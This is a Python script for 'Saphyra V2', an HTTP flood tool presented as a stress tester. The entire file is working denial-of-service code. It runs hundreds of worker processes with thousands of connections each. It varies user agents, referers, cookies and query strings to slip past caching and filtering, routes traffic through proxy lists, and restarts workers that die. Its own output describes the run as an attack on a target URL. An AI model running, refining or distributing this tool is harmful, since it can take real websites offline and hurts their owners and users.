#!/usr/bin/env python3

from multiprocessing import Process, Manager
import urllib.parse as urlparse
import sys
import getopt
import random
import time
import os
import http.client
import socket
import json
import re

HTTPCLIENT = http.client

DEBUG = False

METHOD_GET  = 'get'
METHOD_POST = 'post'
METHOD_HEAD = 'head'
METHOD_RAND = 'random'

JOIN_TIMEOUT = 1.0
CONN_TIMEOUT = 5.0
REQUEST_TIMEOUT = 15.0

DEFAULT_WORKERS = 100
DEFAULT_SOCKETS = 5000
DEFAULT_RAMP_TIME = 30

# Default user agents if file not found
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
]

class Saphyra(object):

    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None
    useragents = []
    proxies = []
    paths = []

    # Properties
    url = None

    # Options
    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET
    ramp_time = DEFAULT_RAMP_TIME
    attack_duration = 0

    def __init__(self, url):
        self.url = url
        self.manager = Manager()
        self.counter = self.manager.list((0, 0))
        self.start_time = time.time()

    def exit(self):
        self.stats()
        print("\nSaphyra V2 attack completed")
        print(f"Total requests: {self.counter[0]}")
        print(f"Failed requests: {self.counter[1]}")
        print(f"Attack duration: {time.time() - self.start_time:.2f} seconds")

    def __del__(self):
        self.exit()

    def printHeader(self):
        print("\n" + "="*70)
        print("SAPHYRA V2 - ENHANCED STRESS TESTING TOOL")
        print("="*70)

    def fire(self):
        self.printHeader()
        print(f"TARGET: {self.url}")
        print(f"MODE: '{self.method.upper()}' - WORKERS: {self.nr_workers} - CONNECTIONS: {self.nr_sockets}")
        print(f"RAMP TIME: {self.ramp_time}s - USER AGENTS: {len(self.useragents)}")
        print(f"PATHS: {len(self.paths)} - PROXIES: {len(self.proxies)}")
        print("="*70 + "\n")

        # Start workers gradually
        ramp_step = max(1, self.nr_workers // 10)
        current_workers = 0
        
        while current_workers < self.nr_workers:
            num_to_start = min(ramp_step, self.nr_workers - current_workers)
            
            for i in range(num_to_start):
                try:
                    worker = Striker(
                        self.url, 
                        self.nr_sockets, 
                        self.counter,
                        useragents=self.useragents,
                        method=self.method,
                        paths=self.paths,
                        proxies=self.proxies
                    )
                    self.workersQueue.append(worker)
                    worker.start()
                    current_workers += 1
                except Exception as e:
                    print(f"Failed to start worker: {str(e)}")
            
            if DEBUG:
                print(f"Started {num_to_start} workers (Total: {current_workers}/{self.nr_workers})")
            
            time.sleep(self.ramp_time / 10)
        
        self.monitor()

    def stats(self):
        try:
            if self.counter[0] > 0 or self.counter[1] > 0:
                print(f"\rRequests: {self.counter[0]} | Failed: {self.counter[1]} | Rate: {self.counter[0] / max(1, time.time() - self.start_time):.1f} req/s", end='')
                sys.stdout.flush()
        except Exception:
            pass

    def monitor(self):
        try:
            while any(worker.is_alive() for worker in self.workersQueue):
                self.stats()
                time.sleep(1)
                
                # Check if any worker died and restart
                for i, worker in enumerate(self.workersQueue):
                    if not worker.is_alive():
                        if DEBUG:
                            print(f"\nRestarting worker {i}")
                        new_worker = Striker(
                            self.url, 
                            self.nr_sockets, 
                            self.counter,
                            useragents=self.useragents,
                            method=self.method,
                            paths=self.paths,
                            proxies=self.proxies
                        )
                        self.workersQueue[i] = new_worker
                        new_worker.start()
                        
        except (KeyboardInterrupt, SystemExit):
            print("\nCTRL+C received. Stopping all workers")
            for worker in self.workersQueue:
                try:
                    worker.stop()
                except:
                    pass
            os._exit(1)

class Striker(Process):

    # Counters
    request_count = 0
    failed_count = 0

    # Containers
    url = None
    host = None
    port = 80
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS
    paths = []
    proxies = []
    current_proxy = None

    # Flags
    runnable = True

    # Options
    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter, useragents=None, method=METHOD_GET, paths=None, proxies=None):
        super().__init__()
        self.daemon = True
        self.counter = counter
        self.nr_socks = nr_sockets
        self.useragents = useragents or DEFAULT_USER_AGENTS
        self.method = method
        self.paths = paths or []
        self.proxies = proxies or []

        parsedUrl = urlparse.urlparse(url)
        self.ssl = parsedUrl.scheme == 'https'
        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path or '/'
        self.port = parsedUrl.port or (443 if self.ssl else 80)

        self.referers = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://www.yahoo.com/',
            'https://www.duckduckgo.com/',
            'https://' + self.host + '/'
        ]

    def __del__(self):
        self.stop()

    def buildblock(self, size):
        return ''.join(random.choices(
            'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
            k=size
        ))

    def run(self):
        if DEBUG:
            print(f"Worker {self.name} started")

        while self.runnable:
            try:
                # Rotate proxy periodically
                if self.proxies and random.random() < 0.3:
                    self.current_proxy = random.choice(self.proxies)
                
                # Create connections
                self.create_connections()
                
                # Send requests
                for conn in self.socks:
                    self.send_request(conn)
                    
                # Read responses
                for conn in self.socks:
                    self.read_response(conn)
                    
            except Exception as e:
                self.incFailed()
                if DEBUG:
                    print(f"Worker error: {str(e)}")
            
            finally:
                self.closeConnections()
                time.sleep(0.05)  # Brief pause between cycles

    def create_connections(self):
        self.socks = []
        for _ in range(self.nr_socks):
            try:
                if self.current_proxy:
                    proxy_host, proxy_port = self.current_proxy.split(':')
                    conn = HTTPCLIENT.HTTPSConnection(proxy_host, int(proxy_port), timeout=CONN_TIMEOUT) if self.ssl \
                           else HTTPCLIENT.HTTPConnection(proxy_host, int(proxy_port), timeout=CONN_TIMEOUT)
                else:
                    conn = HTTPCLIENT.HTTPSConnection(self.host, self.port, timeout=CONN_TIMEOUT) if self.ssl \
                           else HTTPCLIENT.HTTPConnection(self.host, self.port, timeout=CONN_TIMEOUT)
                self.socks.append(conn)
            except Exception:
                self.incFailed()

    def send_request(self, conn):
        try:
            url, headers = self.createPayload()
            method = random.choice([METHOD_GET, METHOD_POST, METHOD_HEAD]) if self.method == METHOD_RAND else self.method
            
            # Use proxy tunneling if proxy is set
            if self.current_proxy:
                full_url = f"{'https' if self.ssl else 'http'}://{self.host}{url}"
                conn.request(method.upper(), full_url, headers=headers)
            else:
                conn.request(method.upper(), url, headers=headers)
        except Exception:
            self.incFailed()

    def read_response(self, conn):
        try:
            resp = conn.getresponse()
            resp.read(1024)  # Read partial response
            self.incCounter()
        except Exception:
            self.incFailed()

    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass
        self.socks = []

    def createPayload(self):
        req_url, headers = self.generateData()
        return (req_url, headers)

    def generateQueryString(self, ammount=1):
        params = []
        for _ in range(ammount):
            key_len = random.randint(3, 10)
            val_len = random.randint(3, 20)
            key = self.buildblock(key_len)
            val = self.buildblock(val_len)
            params.append(f"{key}={val}")
        return '&'.join(params)
    
    def generateData(self):
        # Select random path if available
        base_path = random.choice(self.paths) if self.paths else self.url
        param_joiner = '&' if '?' in base_path else '?'
        
        # Randomly add query parameters
        request_url = base_path
        if random.random() < 0.8:  # 80% chance to add query params
            request_url += param_joiner + self.generateQueryString(random.randint(1, 5))
        
        http_headers = self.generateRandomHeaders()
        
        return (request_url, http_headers)

    def generateRandomHeaders(self):
        # Common headers
        headers = {
            'User-Agent': random.choice(self.useragents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'fr-FR,fr;q=0.8', 'es-ES,es;q=0.7']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
            'Connection': random.choice(['keep-alive', 'close']),
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
        }
        
        # Random referer
        if random.random() < 0.7:
            headers['Referer'] = random.choice(self.referers) + self.buildblock(random.randint(5,15))
        
        # Random cookies
        if random.random() < 0.5:
            cookies = []
            for _ in range(random.randint(1,4)):
                cookie_name = self.buildblock(random.randint(3,8))
                cookie_value = self.buildblock(random.randint(10,30))
                cookies.append(f"{cookie_name}={cookie_value}")
            headers['Cookie'] = '; '.join(cookies)
        
        # Mobile headers sometimes
        if random.random() < 0.3:
            headers['X-Requested-With'] = 'com.android.browser'
            headers['X-Wap-Proxy'] = 'none'
        
        return headers

    def stop(self):
        self.runnable = False
        self.closeConnections()
        if self.is_alive():
            self.terminate()

    def incCounter(self):
        try:
            self.counter[0] += 1
        except Exception:
            pass

    def incFailed(self):
        try:
            self.counter[1] += 1
        except Exception:
            pass

def usage():
    print('Usage: saphyra_v2.py [options] -t <url>')
    print('Options:')
    print('  -w NUM     Number of workers (default: 100)')
    print('  -s NUM     Sockets per worker (default: 5000)')
    print('  -m METHOD  HTTP method (get, post, head, random)')
    print('  -u FILE    User agents file (optional)')
    print('  -p FILE    Paths file (optional)')
    print('  -x FILE    Proxies file (optional)')
    print('  -r SEC     Ramp time in seconds (default: 30)')
    print('  -d         Enable debug mode')
    print('Example: saphyra_v2.py -w 150 -s 3000 -r 45 -t https://example.com')

def print_banner():
    print(r"""
   _____       __  __          __      __          
  / ___/____ _/ /_/ /_  __  __/ /___ _/ /_____ ____
  \__ \/ __ `/ __/ __ \/ / / / / __ `/ __/ __ `/ _ \
 ___/ / /_/ / /_/ / / / /_/ / / /_/ / /_/ /_/ /  __/
/____/\__,_/\__/_/ /_/\__,_/_/\__,_/\__/\__,_/\___/ 

              V2 - ENHANCED STRESS TEST TOOL
    """)

def load_large_file(filename):
    """Load large file efficiently with memory management"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Warning: Could not load file {filename} - {str(e)}")
        return None

def load_default_useragents():
    """Try to load user agents from default locations"""
    locations = [
        '/sdcard/sapyra/lists/useragents.txt',
        '/sapyra/lists/useragents.txt',
        '/storage/emulated/0/sapyra/lists/useragents.txt'
    ]
    
    for location in locations:
        if os.path.exists(location):
            print(f"Found user agents at: {location}")
            agents = load_large_file(location)
            if agents:
                print(f"Loaded {len(agents)} user agents")
                return agents
    print("Using default user agents")
    return DEFAULT_USER_AGENTS

def main():
    try:
        print_banner()
        
        if len(sys.argv) < 2:
            usage()
            sys.exit(2)
            
        # Parse command line options
        target_url = None
        workers = DEFAULT_WORKERS
        socks = DEFAULT_SOCKETS
        method = METHOD_GET
        ramp_time = DEFAULT_RAMP_TIME
        uas_file = None
        paths_file = None
        proxies_file = None
        global DEBUG
        
        try:
            opts, args = getopt.getopt(sys.argv[1:], "hw:s:m:u:p:x:r:dt:", 
                                      ["help", "workers=", "sockets=", "method=", 
                                       "useragents=", "paths=", "proxies=", "ramp=", "debug", "target="])
        except getopt.GetoptError as err:
            print(f"Error: {str(err)}")
            usage()
            sys.exit(2)
        
        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
                sys.exit()
            elif o in ("-w", "--workers"):
                workers = int(a)
            elif o in ("-s", "--sockets"):
                socks = int(a)
            elif o in ("-m", "--method"):
                if a.lower() in (METHOD_GET, METHOD_POST, METHOD_HEAD, METHOD_RAND):
                    method = a.lower()
                else:
                    print(f"Invalid method: {a}")
                    sys.exit(2)
            elif o in ("-u", "--useragents"):
                uas_file = a
            elif o in ("-p", "--paths"):
                paths_file = a
            elif o in ("-x", "--proxies"):
                proxies_file = a
            elif o in ("-r", "--ramp"):
                ramp_time = float(a)
            elif o in ("-d", "--debug"):
                DEBUG = True
            elif o in ("-t", "--target"):
                target_url = a
        
        # Validate target URL
        if not target_url:
            print("Error: Target URL is required (-t option)")
            usage()
            sys.exit(2)
            
        if not target_url.startswith('http'):
            print("Error: URL must start with http:// or https://")
            sys.exit(2)
            
        # Load user agents
        if uas_file:
            print(f"Using custom user agents file: {uas_file}")
            useragents = load_large_file(uas_file) or DEFAULT_USER_AGENTS
        else:
            useragents = load_default_useragents()
        
        # Load other resources
        paths = load_large_file(paths_file) if paths_file else None
        proxies = load_large_file(proxies_file) if proxies_file else None
        
        # Initialize and start attack
        saphyra = Saphyra(target_url)
        saphyra.nr_workers = workers
        saphyra.nr_sockets = socks
        saphyra.method = method
        saphyra.ramp_time = ramp_time
        saphyra.useragents = useragents
        
        if paths:
            saphyra.paths = paths
        if proxies:
            saphyra.proxies = [p.strip() for p in proxies if ':' in p]
            
        saphyra.fire()

    except Exception as e:
        print(f"Fatal error: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()